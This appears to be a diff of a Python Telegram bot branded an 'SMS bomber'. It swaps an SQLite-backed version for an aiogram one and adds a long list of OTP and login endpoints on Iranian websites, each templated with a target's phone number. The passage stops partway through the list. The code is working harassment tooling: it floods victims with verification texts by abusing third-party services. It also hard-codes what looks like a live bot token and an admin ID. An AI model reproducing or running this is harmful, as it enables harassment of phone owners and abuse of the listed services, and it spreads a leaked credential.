@@ -1,769 +1,1735 @@
 #!/usr/bin/env python3
-# -*- coding: utf-8 -*-
 
-"""
-🍞 BREAD — SMS BOMBER TELEGRAM BOT
-COMPLETE FIXED VERSION FOR PYTHON 3.13+
-USES LATEST TELEGRAM LIBRARY
-"""
-
-import os
-import sys
-import json
-import sqlite3
 import asyncio
+import aiohttp
 import random
-import re
 import time
-import uuid
+from aiogram import Bot, Dispatcher, types, F
+from aiogram.filters import CommandStart, Command
+from aiogram.client.default import DefaultBotProperties
+from aiogram.utils.keyboard import ReplyKeyboardBuilder, InlineKeyboardBuilder
+from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
 import logging
-from datetime import datetime, timedelta
-from typing import Dict, List, Optional, Tuple, Any
 
-# ============================================================
-# INSTALL DEPENDENCIES
-# ============================================================
+# Configure logging
+logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
+logger = logging.getLogger(__name__)
 
-def install_packages():
-    packages = [
-        ("python-telegram-bot", "20.7"),
-        ("aiohttp", "3.9.1"),
-        ("fake-useragent", "1.4.0")
-    ]
-    for pkg, ver in packages:
-        try:
-            if pkg == "python-telegram-bot":
-                import telegram
-            elif pkg == "aiohttp":
-                import aiohttp
-            elif pkg == "fake-useragent":
-                import fake_useragent
-        except ImportError:
-            print(f"Installing {pkg}=={ver}...")
-            os.system(f"pip install {pkg}=={ver}")
+# --- [ CONFIGURATION ] ---
+BOT_TOKEN = "8735707765:AAELATdZIyvOka_RIakWl6-uLCi2FICDjfs"
+DEVELOPER_ID = "@SIDIKI_MUSTAFA_92"  # Developer ID
+ADMIN_IDS = [8179218740]  # Add admin user IDs here
 
-install_packages()
+bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode="HTML"))
+dp = Dispatcher()
+stop_signals = {}
+user_attacks = {}
+attack_stats = {}
 
-# ============================================================
-# IMPORTS
-# ============================================================
+# --- [ ANIMATION FRAMES ] ---
+ANIMATION_FRAMES = [
+    "🔄 Processing...",
+    "⚡ Firing APIs...", 
+    "🔥 Bombarding...",
+    "💥 Exploding...",
+    "🚀 Launching...",
+    "🎯 Targeting..."
+]
 
-try:
-    from telegram import Update
-    from telegram.ext import Application, CommandHandler, ContextTypes
-except Exception as e:
-    print(f"Installing telegram...")
-    os.system("pip install python-telegram-bot==20.7")
-    from telegram import Update
-    from telegram.ext import Application, CommandHandler, ContextTypes
-
-try:
-    import aiohttp
-except:
-    os.system("pip install aiohttp==3.9.1")
-    import aiohttp
-
-try:
-    from fake_useragent import UserAgent
-except:
-    os.system("pip install fake-useragent==1.4.0")
-    from fake_useragent import UserAgent
-
-# ============================================================
-# CONFIGURATION
-# ============================================================
-
-class Config:
-    BOT_TOKEN = "8735707765:AAELATdZIyvOka_RIakWl6-uLCi2FICDjfs"
-    ADMIN_IDS = [8179218740]
-    ATTACK_DURATION = 300
-    TIMEOUT = 10
-    API_TEMPLATES_FILE = 'api_templates.json'
-    DATABASE_PATH = 'data/sms_bomber.db'
-
-# ============================================================
-# DATABASE
-# ============================================================
-
-class Database:
-    def __init__(self, db_path: str = Config.DATABASE_PATH):
-        self.db_path = db_path
-        os.makedirs(os.path.dirname(db_path), exist_ok=True)
-        self._init_db()
-    
-    def _init_db(self):
-        with sqlite3.connect(self.db_path) as conn:
-            cursor = conn.cursor()
-            cursor.execute('''
-                CREATE TABLE IF NOT EXISTS users (
-                    user_id INTEGER PRIMARY KEY,
-                    username TEXT,
-                    first_name TEXT,
-                    last_name TEXT,
-                    access_expiry TEXT,
-                    is_active INTEGER DEFAULT 1,
-                    total_attacks INTEGER DEFAULT 0
-                )
-            ''')
-            cursor.execute('''
-                CREATE TABLE IF NOT EXISTS active_attacks (
-                    user_id INTEGER PRIMARY KEY,
-                    phone_number TEXT,
-                    attack_id TEXT,
-                    start_time TEXT DEFAULT CURRENT_TIMESTAMP,
-                    is_running INTEGER DEFAULT 1,
-                    requests_sent INTEGER DEFAULT 0
-                )
-            ''')
-            cursor.execute('''
-                CREATE TABLE IF NOT EXISTS attack_logs (
-                    id INTEGER PRIMARY KEY AUTOINCREMENT,
-                    user_id INTEGER,
-                    phone_number TEXT,
-                    attack_id TEXT UNIQUE,
-                    requests_sent INTEGER DEFAULT 0,
-                    success_count INTEGER DEFAULT 0,
-                    fail_count INTEGER DEFAULT 0,
-                    start_time TEXT DEFAULT CURRENT_TIMESTAMP,
-                    end_time TEXT,
-                    status TEXT DEFAULT 'running'
-                )
-            ''')
-            conn.commit()
-    
-    def add_user(self, user_id: int, username: str = None, first_name: str = None, 
-                 last_name: str = None, expiry: str = None) -> bool:
-        try:
-            with sqlite3.connect(self.db_path) as conn:
-                cursor = conn.cursor()
-                cursor.execute('''
-                    INSERT OR REPLACE INTO users 
-                    (user_id, username, first_name, last_name, access_expiry, is_active)
-                    VALUES (?, ?, ?, ?, ?, 1)
-                ''', (user_id, username, first_name, last_name, expiry))
-                conn.commit()
-                return True
-        except:
-            return False
-    
-    def remove_user(self, user_id: int) -> bool:
-        try:
-            with sqlite3.connect(self.db_path) as conn:
-                cursor = conn.cursor()
-                cursor.execute('DELETE FROM users WHERE user_id = ?', (user_id,))
-                cursor.execute('DELETE FROM active_attacks WHERE user_id = ?', (user_id,))
-                conn.commit()
-                return True
-        except:
-            return False
-    
-    def get_user(self, user_id: int) -> Optional[Dict]:
-        try:
-            with sqlite3.connect(self.db_path) as conn:
-                cursor = conn.cursor()
-                cursor.execute('SELECT * FROM users WHERE user_id = ?', (user_id,))
-                row = cursor.fetchone()
-                if row:
-                    columns = [desc[0] for desc in cursor.description]
-                    return dict(zip(columns, row))
-                return None
-        except:
-            return None
-    
-    def user_has_access(self, user_id: int) -> bool:
-        user = self.get_user(user_id)
-        if not user:
-            return False
-        if not user.get('is_active'):
-            return False
-        expiry = user.get('access_expiry')
-        if not expiry:
-            return False
-        try:
-            expiry_date = datetime.fromisoformat(expiry)
-            return datetime.now() < expiry_date
-        except:
-            return False
-    
-    def start_attack(self, user_id: int, phone_number: str) -> str:
-        attack_id = str(uuid.uuid4())[:8]
-        with sqlite3.connect(self.db_path) as conn:
-            cursor = conn.cursor()
-            cursor.execute('''
-                INSERT OR REPLACE INTO active_attacks 
-                (user_id, phone_number, attack_id, start_time, is_running, requests_sent)
-                VALUES (?, ?, ?, CURRENT_TIMESTAMP, 1, 0)
-            ''', (user_id, phone_number, attack_id))
-            cursor.execute('''
-                INSERT INTO attack_logs 
-                (user_id, phone_number, attack_id, start_time, status)
-                VALUES (?, ?, ?, CURRENT_TIMESTAMP, 'running')
-            ''', (user_id, phone_number, attack_id))
-            conn.commit()
-        return attack_id
-    
-    def stop_attack(self, user_id: int) -> bool:
-        with sqlite3.connect(self.db_path) as conn:
-            cursor = conn.cursor()
-            attack = cursor.execute('''
-                SELECT attack_id FROM active_attacks 
-                WHERE user_id = ? AND is_running = 1
-            ''', (user_id,)).fetchone()
-            if attack:
-                cursor.execute('''
-                    UPDATE active_attacks SET is_running = 0 
-                    WHERE user_id = ?
-                ''', (user_id,))
-                cursor.execute('''
-                    UPDATE attack_logs SET end_time = CURRENT_TIMESTAMP, status = 'stopped' 
-                    WHERE attack_id = ?
-                ''', (attack[0],))
-                conn.commit()
-                return True
-        return False
-    
-    def is_attack_running(self, user_id: int) -> bool:
-        with sqlite3.connect(self.db_path) as conn:
-            cursor = conn.cursor()
-            cursor.execute('''
-                SELECT * FROM active_attacks WHERE user_id = ? AND is_running = 1
-            ''', (user_id,))
-            return cursor.fetchone() is not None
-    
-    def update_attack_stats(self, attack_id: str, success: int = 0, fail: int = 0):
-        with sqlite3.connect(self.db_path) as conn:
-            cursor = conn.cursor()
-            cursor.execute('''
-                UPDATE attack_logs 
-                SET requests_sent = requests_sent + ?, 
-                    success_count = success_count + ?, 
-                    fail_count = fail_count + ?
-                WHERE attack_id = ?
-            ''', (success + fail, success, fail, attack_id))
-            cursor.execute('''
-                UPDATE active_attacks 
-                SET requests_sent = requests_sent + ?
-                WHERE attack_id = ?
-            ''', (success + fail, attack_id))
-            conn.commit()
-    
-    def complete_attack(self, attack_id: str):
-        with sqlite3.connect(self.db_path) as conn:
-            cursor = conn.cursor()
-            cursor.execute('''
-                UPDATE attack_logs SET end_time = CURRENT_TIMESTAMP, status = 'completed' 
-                WHERE attack_id = ?
-            ''', (attack_id,))
-            cursor.execute('''
-                UPDATE active_attacks SET is_running = 0 
-                WHERE attack_id = ?
-            ''', (attack_id,))
-            conn.commit()
-    
-    def get_state(self) -> Dict:
-        with sqlite3.connect(self.db_path) as conn:
-            cursor = conn.cursor()
-            cursor.execute('SELECT COUNT(*) FROM users')
-            total_users = cursor.fetchone()[0] or 0
-            cursor.execute('SELECT COUNT(*) FROM active_attacks WHERE is_running = 1')
-            active = cursor.fetchone()[0] or 0
-            cursor.execute('SELECT SUM(success_count) FROM attack_logs')
-            total_success = cursor.fetchone()[0] or 0
-            return {
-                'total_users': total_users,
-                'active_attacks': active,
-                'total_success': total_success,
-                'timestamp': datetime.now().isoformat()
+# --- [ ULTIMATE API COLLECTION - FIXED ] ---
+ULTIMATE_APIS = [
+    {
+        "source": "neshan.org",
+        "url": "https://neshan.org/maps/pwa-api/login/sms/request?mobileNumber=0{phone}&uuid=web_019e8459-9674-749c-bfe3-7b0364eba2d9",
+        "method": "GET",
+        "capacity": 10,
+        "ticket": 20
+    },
+    {
+        "source": "#karnaval.ir",
+        "url": "https://www.karnaval.ir/api/gateway/marketing-campaign-mobile-popup/marketing-campaign-mobile-popup/create",
+        "json": {
+            "campaignId":"000000000000000000000001",
+            "mobile":"0{phone}"
+        },
+        "method": "POST",
+        "capacity": 10,
+        "ticket": 5
+    },
+    {
+        "source": "balad.ir",
+        "url": "https://account.api.balad.ir/api/web/auth/login/",
+        "json": {
+            "phone_number":"0{phone}",
+            "os_type":"W"
+        },
+        "method": "POST",
+        "capacity": 10,
+        "ticket": 30
+    },
+    {   
+        "source": "keylid.com",
+        "url": "https://api.accounts.keylid.com/api/auth/v2/users/register/",
+        "json": {
+            "phone_number":"98{phone}",
+            "srv":"itunes"
+        },
+        "method": "POST",
+        "capacity": 20,
+        "ticket": 34
+    },
+    {
+        "source": "vmusic.ir",
+        "url": "https://api.vmusic.ir/auth/otp/request",
+        "json": {
+            "mobile":"0{phone}"
+        },
+        "method": "POST",
+        "capacity": 15,
+        "ticket": 20
+    },
+    {   
+        "source": "nazdikeh.com",
+        "url": "https://www.nazdikeh.com/api/customers/login-register",
+        "data": {
+            "step": 1,
+            "ReturnUrl": "/",
+            "mobile": "0{phone}"
+        },
+        "method": "POST",
+        "capacity": 30,
+        "ticket": 54
+    },
+    {
+        "source": "janebi.com",
+        "url": "https://janebi.com/signin",
+        "data": {
+            "user_mobile":"0{phone}",
+            "confirm_code": "",
+            "popup": 1,
+            "signin": 1
+        },
+        "method": "POST",
+        "capacity": 30,
+        "ticket": 44
+    },
+    {
+        "source": "mizamon.com",
+        "url": "https://mizamon.com/wp-admin/admin-ajax.php",
+        "data": {
+            "login_method": "code",
+            "phone_number": "0{phone}",
+            "action": "ehraz_sms_otp_phone_verify",
+            "ehraz_nonce": "1d51bec07c"
+        },
+        "method": "POST",
+        "capacity": 10,
+        "ticket": 32
+    },
+    {
+        "source": "sepehrcc.com",
+        "url": "https://app.sepehrcc.com/newapi/v1/Auth/Register/Mobile/0{phone}",
+        "method": "GET",
+        "capacity": 39,
+        "ticket": 62
+    },
+    {
+        "source": "70kala.ir",
+        "url": "https://70kala.ir/wp-json/pinova/user/authenticate",
+        "json": {
+            "identifier": "0{phone}"
+        },
+        "method": "POST",
+        "capacity": 12,
+        "ticket": 36
+    },
+    {
+        "source": "#mobile140.com",
+        "url": "https://eloquent-feistel-xpkrs3vmp6.liara.run/api/send",
+        "json": {
+            "type": "event",
+            "payload": {
+                "website": "32e11191-2e9b-41df-80ca-fb209d727569",
+                "hostname": "mobile140.com", "screen": "1566x364", 
+                "language": "en-US", 
+                "url":"/login?view=confirm&mobile=0{phone}&exist=false&redirect=/",
+                "referrer":"/login?redirect=/"
             }
-    
-    def clear_state(self):
-        with sqlite3.connect(self.db_path) as conn:
-            cursor = conn.cursor()
-            cursor.execute('DELETE FROM attack_logs')
-            cursor.execute('DELETE FROM active_attacks')
-            cursor.execute('DELETE FROM users')
-            conn.commit()
+        },
+        "method": "POST",
+        "capacity": 10,
+        "ticket": 43
+    },
+    {
+        "source": "aloghesti.com",
+        "url": "https://api.aloghesti.com/api/v1/initial-user",
+        "json": {
+            "mobile": "0{phone}"
+        },
+        "method": "POST",
+        "capacity": 20,
+        "ticket": 38
+    },
+    {
+        "source": "doozshop.com",
+        "url": "https://doozshop.com/wp-admin/admin-ajax.php",
+        "data": {
+            "action": "mobile_login",
+            "mobile": "0{phone}",
+            "step": "send_code"
+        },
+        "method": "POST",
+        "capacity": 22,
+        "ticket": 38
+    },
+    {   
+        "source": "iranmojo.com",
+        "url": "https://iranmojo.com/wp-admin/admin-ajax.php",
+        "data": {
+            "recaptcha_token": null,
+            "phone": "09377972212",
+            "controller": "auth-register_phone",
+            "action": "iranmojo_guest",
+            "dev": 2024
+        },
+        "method": "POST",
+        "capacity": 32,
+        "ticket": 47
+    },
+    {
+        "source": "#19kala.com",
+        "url": "https://www.19kala.com/users/register",
+        "json": {
+            "mobile": "0{phone}",
+            "password": "12345678e",
+            "agree": 1
+        },
+        "method": "POST",
+        "capacity": 17,
+        "ticket": 43
+    },
+    {
+        "source": "#abadis.ir",
+        "url": "https://abadis.ir/user/ajaxcmd/registernew/",
+        "data": {
+            "loginID": "0{phone}"
+        },
+        "method": "POST",
+        "capacity": 10,
+        "ticket": 29
+    },
+    {
+        "source": "#alibaba.ir",
+        "url": "https://ws.alibaba.ir/api/v3/account/mobile/otp",
+        "json": {
+            "phoneNumber": "{phone}"
+        },
+        "method": "POST",
+        "capacity": 8,
+        "ticket": 62
+    },
+    {
+        "source": "#anardoni.com",
+        "url": "https://api.anardoni.com/api/v2/auth/v2/send_code",
+        "json": {
+            "mobile": "0{phone}",
+            "verify_code_type": "login"
+        },
+        "method": "POST",
+        "capacity": 10,
+        "ticket": 43
+    },
+    {
+        "source": "#anten.ir",
+        "url": "https://api2.anten.ir/ids/api/auth/register",
+        "json": {
+            "phone": "0{phone}"
+        },
+        "method": "POST",
+        "capacity": 20,
+        "ticket": 0
+    },
+    {
+        "source": "#azki.com",
+        "url": "https://www.azki.com/api/core/v2/app/auth/check-login-availability/",
+        "json": {
+            "phoneNumber": "0{phone}",
+            "origin": "www.azki.com"
+        },
+        "method": "POST",
+        "capacity": 0,
+        "ticket": 0
+    },
+    {
+        "source": "#banimode.com",
+        "url": "https://mobapi.banimode.com/api/v2/auth/request",
+        "json": {
+            "phone": "0{phone}"
+        },
+        "method": "POST",
+        "capacity": 20,
+        "ticket": 0
+    },
+    {
+        "source": "#boghrat.com",
+        "url": "https://admapi.boghrat.com/boghratsite/Account/RegisterOTP",
+        "json": {
+            "Phonenumber": "0{phone}",
+            "recaptcha": null,
+            "AppointmentCode": ""
+        },
+        "method": "POST",
+        "capacity": 20,
+        "ticket": 0
+    },
+    {
+        "source": "#dastyar.io",
+        "url": "https://api.dastyar.io/express/subscription/sendSms",
+        "json": {
+            "phoneNumber": "0{phone}"
+        },
+        "method": "POST",
+        "capacity": 0,
+        "ticket": 0
+    },
+    {
+        "source": "#delino.com",
+        "url": "https://www.delino.com/User/PreRegister",
+        "data": {
+            "mobile": "0{phone}"
+        },
+        "method": "POST",
+        "capacity": 20,
+        "ticket": 0
+    },
+    {
+        "source": "#ebpnovin.com",
+        "url": "https://www.ebpnovin.com/index.php?route=users/login",
+        "data": {
+            "username": "0{phone}"
+        },
+        "method": "POST",
+        "capacity": 0,
+        "ticket": 0
+    },
+    {
+        "source": "#esam.ir",
+        "url": "https://api.esam.ir/api/account/v3/RegisterUserv3",
+        "json": {
+            "mobile": "0{phone}",
+            "present_type": "WebApp",
+            "registration_method": 0,
+            "serialNumber": ""
+        },
+        "method": "POST",
+        "capacity": 20,
+        "ticket": 0
+    },
+    {
+        "source": "#files.ir",
+        "url": "https://my.files.ir/api/v1/mobile/sms/forgot-password/send",
+        "json": {
+            "mobile": "0{phone}"
+        },
+        "method": "POST",
+        "capacity": 0,
+        "ticket": 0
+    },
+    {
+        "source": "#flytoday.ir",
+        "url": "https://www.flytoday.ir/api/collect",
+        "json": {
+            "plaintext": "+98{phone}"
+        },
+        "method": "POST",
+        "capacity": 20,
+        "ticket": 0
+    },
+    {
+        "source": "#hiss.ir",
+        "url": "https://hiss.ir/bakala/ajax/send_code/",
+        "data": {
+            "action": "bakala_send_code",
+            "phone_email": "0{phone}"
+        },
+        "method": "POST",
+        "capacity": 0,
+        "ticket": 0
+    },
+    {
+        "source": "#iranconcert.com",
+        "url": "https://www.iranconcert.com/user/check",
+        "json": {
+            "mobile": "0{phone}"
+        },
+        "method": "POST",
+        "capacity": 0,
+        "ticket": 0
+    },
+    {
+        "source": "#iranecar.ir",
+        "url": "https://nextapi.iranecar.com/auth/api/v1/User/GetUserBaseInfo",
+        "json": {
+            "emailOrNumber": "0{phone}",
+            "userType": "siteUser"
+        },
+        "method": "POST",
+        "capacity": 0,
+        "ticket": 0
+    },
+    {
+        "source": "#itoll.com",
+        "url": "https://app.itoll.com/api/v1/auth/login",
+        "json": {
+            "mobile": "0{phone}"
+        },
+        "method": "POST",
+        "capacity": 0,
+        "ticket": 0
+    },
+    {
+        "source": "#kanape.ir",
+        "url": "https://api.kanape.ir/v4/auth/otp",
+        "json": {
+            "mobile": "0{phone}"
+        },
+        "method": "POST",
+        "capacity": 9,
+        "ticket": 0
+    },
+    {
+        "source": "#lastsecond.ir",
+        "url": "https://api.lastsecond.ir/auth/register/token",
+        "json": {
+            "firstName": "\u00da\u2020",
+            "lastName": "\u00d9\u201a",
+            "username": "0{phone}",
+            "referralCode": "",
+            "termsAndConditions": true
+        },
+        "method": "POST",
+        "capacity": 1,
+        "ticket": 0
+    },
+    {
+        "source": "#lenz.ir",
+        "url": "https://api-v3.lenz.ir/api/v3/user-management/otp/register",
+        "json": {
+            "msisdn": "98{phone}"
+        },
+        "method": "POST",
+        "capacity": 1,
+        "ticket": 0
+    },
+    {
+        "source": "#malltina.com",
+        "url": "https://api.malltina.com/api/v2/check-user",
+        "json": {
+            "user": "0{phone}"
+        },
+        "method": "POST",
+        "capacity": 20,
+        "ticket": 0
+    },
+    {
+        "source": "#mizito.ir",
+        "url": "https://app.mizito.ir/capi/session/register",
+        "json": {
+            "step": 1,
+            "activate_method": "sms",
+            "email": "",
+            "phone": "0{phone}",
+            "username": "0{phone}",
+            "pin_code": "",
+            "firstname": "",
+            "lastname": "",
+            "workspace_name": "",
+            "password": "",
+            "repassword": "",
+            "teammates": [
+                {
+                    "name": "",
+                    "email_phone": ""
+                }
+            ],
+            "validated": false
+        },
+        "method": "POST",
+        "capacity": 20,
+        "ticket": 0
+    },
+    {
+        "source": "#netbarg.com",
+        "url": "https://netbarg.com/tehran/users/loginByMobile/",
+        "json": {
+            "_method": "POST",
+            "phone": "0{phone}"
+        },
+        "method": "POST",
+        "capacity": 20,
+        "ticket": 0
+    },
+    {
+        "source": "#okcs/com",
+        "url": "https://okcs.com/users/mobilelogin",
+        "data": {
+            "mobile": "0{phone}",
+            "url": "https://okcs.com/"
+        },
+        "method": "POST",
+        "capacity": 0,
+        "ticket": 0
+    },
+    {
+        "source": "#ravandarman.com",
+        "url": "https://papi.ravandarman.com/register/fast",
+        "json": {
+            "firstName": "f",
+            "lastName": "q",
+            "gender": 0,
+            "registerField": "tel",
+            "termsAndConditions": true,
+            "tel": "0{phone}"
+        },
+        "method": "POST",
+        "capacity": 1,
+        "ticket": 0
+    },
+    {
+        "source": "#sheypoor.com",
+        "url": "https://www.sheypoor.com/api/v10.0.0/auth/send",
+        "josn": {
+            "username": "0{phone}"
+        },
+        "method": "POST",
+        "capacity": 0,
+        "ticket": 0
+    },
+    {
+        "source": "#simcart.com",
+        "url": "https://simcart.com/api/v1/users/login-v2/login-type/",
+        "json": {
+            "phone": "0{phone}"
+        },
+        "method": "POST",
+        "capacity": 3,
+        "ticket": 0
+    },
+    {
+        "source": "abantether.com",
+        "url": "https://api.abantether.com/api/v2/auths/register/phone/send",
+        "json": {
+            "phone_number": "0{phone}"
+        },
+        "method": "POST",
+        "capacity": 1,
+        "ticket": 62
+    },
+    {
+        "source": "abrehamrahi.ir",
+        "url": "https://abrehamrahi.ir/api/v6/profile/auth/generate-code/",
+        "json": {
+            "phone": "{phone}",
+            "prefix": "+98"
+        },
+        "method": "POST",
+        "capacity": 2,
+        "ticket": 63
+    },
+    {
+        "source": "achareh.co",
+        "url": "https://api.achareh.co/v2/accounts/login/?web=true",
+        "json": {
+            "phone": "+98{phone}",
+            "context": "general"
+        },
+        "method": "POST",
+        "capacity": 4,
+        "ticket": 65
+    },
+    {
+        "source": "andarz.io",
+        "url": "https://api.andarz.io/api/v2/auth/signup/otp/",
+        "json": {
+            "phone_number": "0{phone}"
+        },
+        "method": "POST",
+        "capacity": 5,
+        "ticket": 65
+    },
+    {
+        "source": "axon.me",
+        "url": "https://axon.me/services/api/identity-service/v1/users/register-login/phr",
+        "json": {
+            "phoneNumber": "0{phone}",
+            "serviceName": "AXON",
+            "needTag": true,
+            "sendAudioOtp": false
+        },
+        "method": "POST",
+        "capacity": 3,
+        "ticket": 64
+    },
+    {
+        "source": "balad.ir",
+        "url": "https://account.api.balad.ir/api/web/auth/login/",
+        "json": {
+            "phone_number": "0{phone}",
+            "os_type": "W"
+        },
+        "method": "POST",
+        "capacity": 1,
+        "ticket": 62
+    },
+    {
+        "source": "basalam.com",
+        "url": "https://services.basalam.com/web/v1/auth/captcha/otp-request",
+        "json": {
+            "mobile": "0{phone}",
+            "client_id": "11",
+            "login_by_backup_mobile": false
+        },
+        "method": "POST",
+        "capacity": 5,
+        "ticket": 14
+    },
+    {
+        "source": "bertina.ir",
+        "url": "https://llm.bertina.ir/api/auth/send-otp",
+        "json": {
+            "mobile": "0{phone}"
+        },
+        "method": "POST",
+        "capacity": 1,
+        "ticket": 62
+    },
+    {
+        "source": "bimebazar.com",
+        "url": "https://bimebazar.com/accounts/api/login_sec/",
+        "json": {
+            "username": "0{phone}",
+            "type": "sms"
+        },
+        "method": "POST",
+        "capacity": 7,
+        "ticket": 11
+    },
+    {
+        "source": "bitpin.ir",
+        "url": "https://api-sejel.bitpin.ir/v1/usr/auth/authentication/",
+        "json": {
+            "password": "12345678e",
+            "resend": false,
+            "use_voice_call": false,
+            "phone": "0{phone}",
+            "device_type": "web"
+        },
+        "method": "POST",
+        "capacity": 20,
+        "ticket": 5
+    },
+    {
+        "source": "boofai.com",
+        "url": "https://heimdall.boofai.com/api/v1/otp/send",
+        "json": {
+            "cellphone": "+98{phone}"
+        },
+        "method": "POST",
+        "capacity": 250,
+        "ticket": 100
+    },
+    {
+        "source": "booking.ir",
+        "url": "https://ws.booking.ir/nagaapi/api/v2/account/sendmobileverificationcode/",
+        "json": {
+            "mobile": "{phone}",
+            "countryCode": "ir"
+        },
+        "method": "POST",
+        "capacity": 5,
+        "ticket": 65
+    },
+    {
+        "source": "cafebazaar.ir",
+        "url": "https://api.cafebazaar.ir/rest-v1/process/GetOtpTokenRequest",
+        "json": {
+            "properties": {
+                "language": 2,
+                "clientID": "ejzbxi83legfl7xgp32qxq4ye4g38oyf",
+                "deviceID": "ejzbxi83legfl7xgp32qxq4ye4g38oyf",
+                "clientVersion": "web"
+            },
+            "singleRequest": {
+                "getOtpTokenRequest": {
+                    "username": "98{phone}"
+                }
+            }
+        },
+        "method": "POST",
+        "capacity": 15,
+        "ticket": 11
+    },
+    {
+        "source": "digikala.com",
+        "url": "https://api.digikala.com/v1/user/authenticate/",
+        "json": {
+            "backUrl": "/",
+            "username": "0{phone}",
+            "otp_call": false,
+            "hash": null
+        },
+        "method": "POST",
+        "capacity": 1,
+        "ticket": 62
+    },
+    {
+        "source": "divar.ir",
+        "url": "https://api.divar.ir/v5/auth/authenticate",
+        "json": {
+            "phone": "0{phone}"
+        },
+        "method": "POST",
+        "capacity": 15,
+        "ticket": 11
+    },
+    {
+        "source": "drnext.ir",
+        "url": "https://cyclops.drnext.ir/v1/doctors/auth/send-verification-token",
+        "json": {
+            "source": "besina",
+            "mobile": "0{phone}",
+            "key": "U2FsdGVkX1+zCbHc0CmLAG4ebLlQNqHSophwTnPEM0FoXqoRPoDTw++WvlGiPsxHCr4zVSSWjJjbvbep14CVNA=="
+        },
+        "method": "POST",
+        "capacity": 4,
+        "ticket": 17
+    },
+    {
+        "source": "drsaina.com",
+        "url": "https://www.drsaina.com/api/v2/authentication/request-totp",
+        "json": {
+            "phoneNumber": "0{phone}"
+        },
+        "method": "POST",
+        "capacity": 10,
+        "ticket": 8
+    },
+    {
+        "source": "elanza.com",
+        "url": "https://api.elanza.com/auth/request",
+        "json": {
+            "contact": "0{phone}"
+        },
+        "method": "POST",
+        "capacity": 1,
+        "ticket": 62
+    },
+    {
+        "source": "eligasht.com",
+        "url": "https://api2.eligasht.com/api/account/register",
+        "json": {
+            "userName": "0{phone}",
+            "recaptchaToken": null
+        },
+        "method": "POST",
+        "capacity": 10,
+        "ticket": 8
+    },
+    {
+        "source": "eseminar.tv",
+        "url": "https://api.eseminar.tv/api/v1/auth/otp/send",
+        "json": {
+            "method": "register",
+            "mobile": "0{phone}"
+        },
+        "method": "POST",
+        "capacity": 5,
+        "ticket": 14
+    },
+    {
+        "source": "faradars.org",
+        "url": "https://api.faradars.org/api/client/v1/auth/otp",
+        "json": {
+            "mobile": "0{phone}",
+            "digits": 5,
+            "platforms": "web",
+            "source": "faradars",
+            "recaptcha_token": ""
+        },
+        "method": "POST",
+        "capacity": 1,
+        "ticket": 62
+    },
+    {
+        "source": "fidibo.com",
+        "url": "https://api.fidibo.com/identity/login/prepare",
+        "json": {
+            "username": "98-{phone}"
+        },
+        "method": "POST",
+        "capacity": 2,
+        "ticket": 32
+    },
+    {
+        "source": "footballi.net",
+        "url": "https://api.footballi.net/api/v2/user/check",
+        "json": {
+            "login": "0{phone}",
+            "country_code": "+98"
+        },
+        "method": "POST",
+        "capacity": 3,
+        "ticket": 22
+    },
+    {
+        "source": "gapfilm.ir",
+        "url": "https://core.gapfilm.ir/api/v3.2/Account/Login",
+        "json": {
+            "Method": 1,
+            "PhoneNo": "{phone}"
+        },
+        "method": "POST",
+        "capacity": 3,
+        "ticket": 22
+    },
+    {
+        "source": "gisheh7.ir",
+        "url": "https://gateway.gisheh7.ir/user/v1/public/auth/otp/generate",
+        "json": {
+            "phone": "0{phone}"
+        },
+        "method": "POST",
+        "capacity": 20,
+        "ticket": 5
+    },
+    {
+        "source": "gsm.ir",
+        "url": "https://marketplace.gsm.ir/api/v1/user/login/",
+        "json": {
+            "phone_number": "+98{phone}"
+        },
+        "method": "POST",
+        "capacity": 2,
+        "ticket": 32
+    },
+    {
+        "source": "haal.ir",
+        "url": "https://haal.ir/api/v2/ConsultantConsult/CheckConsultantExist",
+        "json": {
+            "Mobile": "0{phone}"
+        },
+        "method": "POST",
+        "capacity": 20,
+        "ticket": 20
+    },
+    {
+        "source": "hamyarwp.com",
+        "url": "https://hamyarwp.com/wp-admin/admin-ajax.php?action=hfl_login_with_phone&t=1776772989081",
+        "data": {
+            "username": "0{phone}"
+        },
+        "method": "POST",
+        "capacity": 250,
+        "ticket": 100
+    },
+    {
+        "source": "metisai.ir",
+        "url": "https://api.metisai.ir/api/v1/client/phone-verification/request-otp",
+        "json": {
+            "phoneNumber": "0{phone}"
+        },
+        "method": "POST",
+        "capacity": 39,
+        "ticket": 42
+    },
+    {
+        "source": "mrbilit.ir",
+        "url": "https://content.mrbilit.ir/sms/get_app/send?to=0{phone}",
+        "method": "POST",
+        "capacity": 20,
+        "ticket": 5
+    },
+    {
+        "source": "mrbilit2.ir",
+        "url": "https://auth.mrbilit.ir/api/Token/send?mobile=0{phone}",
+        "method": "GET",
+        "capacity": 1,
+        "ticket": 62
+    },
+    {
+        "source": "namava.ir",
+        "url": "https://www.namava.ir/api/v1.0/accounts/login/by-otp/request",
+        "json": {
+            "UserName": "+98{phone}"
+        },
+        "method": "POST",
+        "capacity": 10,
+        "ticket": 8
+    },
+    {
+        "source": "niazerooz.com",
+        "url": "https://my.niazerooz.com/api/account/requestotp",
+        "json": {
+            "mobile": "0{phone}",
+            "registerReturnUrl": ""
+        },
+        "method": "POST",
+        "capacity": 10,
+        "ticket": 8
+    },
+    {
+        "source": "nobat.ir",
+        "url": "https://api.nobat.ir/patient/login/phone",
+        "json": {
+            "mobile": "0{phone}"
+        },
+        "method": "POST",
+        "capacity": 1,
+        "ticket": 62
+    },
+    {
+        "source": "okala.com",
+        "url": "https://apigateway.okala.com/api/voyager/C/CustomerAccount/OTPRegister",
+        "json": {
+            "mobile": "0{phone}",
+            "deviceTypeCode": 10,
+            "confirmTerms": true,
+            "notRobot": false,
+            "otpType": 0,
+            "ValidationCodeCreateReason": 5,
+            "OtpApp": 0,
+            "IsAppOnly": false
+        },
+        "method": "POST",
+        "capacity": 20,
+        "ticket": 5
+    },
+    {
+        "source": "okian.ai",
+        "url": "https://okian.ai/api/auth/submit-phone-number",
+        "json": {
+            "mobile": "0{phone}"
+        },
+        "method": "POST",
+        "capacity": 1,
+        "ticket": 62
+    },
+    {
+        "source": "pezeshket.com",
+        "url": "https://api.pezeshket.com/core/v1/auth/requestCodeByMobileV2",
+        "json": {
+            "mobileNumber": "0{phone}"
+        },
+        "method": "POST",
+        "capacity": 5,
+        "ticket": 65
+    },
+    {
+        "source": "quera.org",
+        "url": "https://quera.org/accounts/api/register/phone/otp",
+        "json": {
